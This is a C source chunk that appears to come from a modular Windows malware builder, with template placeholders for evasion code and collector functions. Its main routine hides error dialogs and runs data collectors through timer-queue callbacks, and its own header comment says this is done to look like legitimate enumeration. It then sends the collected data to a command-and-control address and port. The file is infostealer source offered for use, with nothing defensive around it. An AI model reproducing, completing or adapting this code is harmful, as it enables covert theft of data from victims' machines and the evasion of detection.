// chunk: arch/callback_abuse
// depends: core/emit_buffer, exfil/*
// provides: main
// headers: windows.h
// note: Executes collectors via Windows callback mechanisms — looks like legitimate enumeration

#ifndef CHUNK_ARCH_CALLBACK
#define CHUNK_ARCH_CALLBACK

typedef void (*collector_fn)(void);

static collector_fn g_callback_collectors[32];
static int g_callback_idx = 0;
static int g_callback_count = 0;

static VOID CALLBACK timer_callback(PVOID param, BOOLEAN fired) {
    (void)param; (void)fired;
    if (g_callback_idx < g_callback_count) {
        g_callback_collectors[g_callback_idx]();
        g_callback_idx++;
    }
}

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
{{EVASION_INIT}}

    init_buffer();
    if (!g_data) return 1;

    collector_fn collectors[] = {
{{COLLECTOR_FN_LIST}}
    };
    g_callback_count = sizeof(collectors) / sizeof(collectors[0]);
    for (int i = 0; i < g_callback_count && i < 32; i++)
        g_callback_collectors[i] = collectors[i];

    HANDLE timer_queue = CreateTimerQueue();
    if (!timer_queue) return 1;

    for (int i = 0; i < g_callback_count; i++) {
        HANDLE ht = NULL;
        CreateTimerQueueTimer(&ht, timer_queue, timer_callback, NULL,
                              500 + i * 1500, 0, WT_EXECUTEDEFAULT);
    }

    Sleep(500 + g_callback_count * 1500 + 2000);
    DeleteTimerQueueEx(timer_queue, INVALID_HANDLE_VALUE);

    if (g_pos > 0)
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);

    free(g_data);
    return 0;
}

#endif
